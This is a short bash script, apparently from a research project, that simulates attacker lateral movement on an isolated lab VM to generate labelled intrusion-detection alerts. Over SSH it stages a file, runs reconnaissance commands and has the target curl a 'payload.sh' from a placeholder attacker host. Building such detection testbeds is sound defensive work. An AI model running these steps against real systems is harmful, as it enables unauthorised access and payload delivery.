#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


# === SETTINGS ===
TARGET_IP="<TARGET_IP>"
TARGET_USER="user"
ATTACKER_IP="<ATTACKER_IP>"  # Kali’s IP (HTTP server)

echo "[+] Starting Phase 5: Lateral Movement Simulation"

# 1. Simulate file staging to peer (simulate attacker copying internal tool)
echo "[+] Simulating internal file staging via SSH..."
ssh ${TARGET_USER}@${TARGET_IP} "echo 'Lateral movement file' > /tmp/lateral_stage.txt"

# 2. Remote command execution
echo "[+] Executing remote command via SSH..."
ssh ${TARGET_USER}@${TARGET_IP} "id && hostname"

# 3. Simulate download of malicious tool from another internal peer (Kali)
echo "[+] Simulating potential lateral tool download..."
ssh ${TARGET_USER}@${TARGET_IP} "curl http://${ATTACKER_IP}/payload.sh -o /tmp/remote_admin_tool.sh"

echo "[+] Phase 5 simulation complete."

